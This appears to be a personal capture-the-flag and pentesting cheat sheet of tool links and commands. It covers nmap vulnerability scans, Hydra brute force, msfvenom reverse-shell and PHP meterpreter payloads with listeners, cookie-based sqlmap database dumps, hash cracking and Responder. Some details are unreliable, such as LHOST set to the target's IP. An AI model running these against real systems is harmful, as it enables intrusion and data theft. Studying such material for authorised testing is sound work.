
dCode FR  
https://www.dcode.fr/en
  
Web Check  
https://web-check.xyz/  
  
Windows CMD Commands  
https://ss64.com/nt/
  
Reverse Sheel  
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
  
Cracking RSA  
https://hascyber.medium.com/cracking-rsa-1f811f9e9a24
  
Crack Station  
https://crackstation.net/  
  
Start Me CTI  
https://start.me/p/rxRbpo/cti
  
Stego Aperisolve  
https://www.aperisolve.com

sha256sum
sha224sum
sha384sum
sha512sum
shasum
openssl dgst


##############################################

FINDING FILES ON LINUX

Hidden Files
find /path/to/search -type f -name ".*.txt"

Files Files by Extension
find . -type f -name "*.csv"

FINDING FILES ON WINDOWS

Hidden Files
cd directory
dir /s /a:h *.txt

Files Files by Extension
dir /s /b *.txt

NMAP BRUTE FORCE CHECK
nmap -sS -A -T4 TARGET

NMAP LOOKING FOR GENERAL VULNS
nmap -Pn --script vuln TARGET

NMAP LOOKING FOR REMOTE LOGIN SERVICES (SSH, TELNET and RDP)
nmap -p 22,23,3389 TARGET -oN /path/Remote-Logins.txt

NMAP LOOKING FOR FTP SERVICE
nmap -p 21 TARGET -oN /path/FTP-Service.txt

NMAP BRUTE FORCE WEB APP
nmap -T4 -A -v SITE ADDRESS

NMAP LOOKING FOR BANNER GRABBING (Version, OS and Services)
nmap -sS -sV -O TARGET -oN /path/Banner-Grabbing.txt

NMAP LOOKING FOR LDAP PORTS
nmap -p 389,636 -sV TARGET -oN /path/LDAP-Ports.txt

NMAP LOOKING FOR HTTP/S PORTS
nmap -sV -A -p 80,443 TARGET -oN /path/HTTP-Ports.txt

NMAP LOOKING FOR MOBILE ANDROID PORTS
nmap -sV -A -p 5555-5585 TARGET -oN /path/Android-Ports.txt

NMAP LOOKING FOR SMB VULNS
nmap -T4 -sS -p 139,445 --script=smb-vuln-* TARGET  -oN /path/SMB-Vulns.txt

NMAP LOOKING FOR UNKNOWN PORTS
nmap -sS -p- TARGET -oN /path/Unknown-Ports.txt

BRUTE FORCE HYDRA SMB
hydra -l static-user -P /home/passlist.txt TARGET smb
hydra -L /path/users-wordlist.txt -P /path/password-wordlist.txt TARGET smb

CONNECT USING SMB CLIENT COMMANDS
smbclient //TARGET/share + ENTER
smbclient -L TARGET  -U USERNAME + ENTER

CONNECT USING ADB
adb connect TARGET:PORT

INVOKING ADB SHELL
adb shell

GET FILES USING ADB
adb pull /paths
adb pull /origin-path destination-path (/home/user/Deskto)

INSTALL ENT APP
apt install ent

GET ENTROPY INFORMATION
ent FILE

CONNECTING TELNET AND GRABBING HTTP INFO
telnet TARGET PORT
GET / HTTP/1.0

MSFVENOM REVERSE NETCAT
msfvenom -p cmd/unix/reverse_netcat LHOST=TARGET-IP LPORT=PORT R
nc -lnvp PORT

MSFVENOM REVERSE PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=TARGET-IP LPORT=PORT -f raw > exploit.php

STEGHIDE SINTAX
sudo apt install steghide
steghide info IMAGE-FILE-NAME
steghide extract -sf IMAGE-FILE-NAME

SIMPLE HTTP SERVER USING PYTHON
python -m http.server PORT

FTP LOGIN COMMAND
ftp TARGET

njRAT RAT
Default Port: 5553

Hybrid Analisys
https://www.hybrid-analysis.com 

DIE
die.exe
Open File > Find the ELF file > Open
Check Advanced > File Info > Entropy or Hash

CHECKING COOKIES IN THE BROWSER
Developer Tools > Console > document.cookie > Enter > Copy Message

SQLMAP USING COOKIE TO GET DATABASES
sqlmap -u "URL" --cookie="Cookie Value" –-dbs

SQLMAP USING COOKIE TO GET TABLES FROM DATABASES
sqlmap -u "URL" --cookie="Cookie Value" -D "DATABASENAME" --tables

SQLMAP USING COOKIE TO GET TABLE CONTENT
sqlmap -u "URL" --cookie="Cookie Value" -D "DATABASENAME" -T "TABLENAME" --dump

USING WHATWEB
whatweb URL ADDRESS

USING OWASP ZAP
apt install zaproxy
Automated Scan > URL > Attack
Active Scan / Alerts / Spider (Messages)

MSCONSOLE REVERSE SHELL PHP
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST and LPORT > run

JSQL
sudo su jsql > URL with ParamID

HASHCAT
hashcat -h | grep "TYPE"
hashcat -m 0 HASH-FILE /path/wordlistfile/

JOHN
john HASH-FILE

RESPONDER
sudo responder -l eth0
/usr/share/responder/logs

LINUX
uname -a
uname -r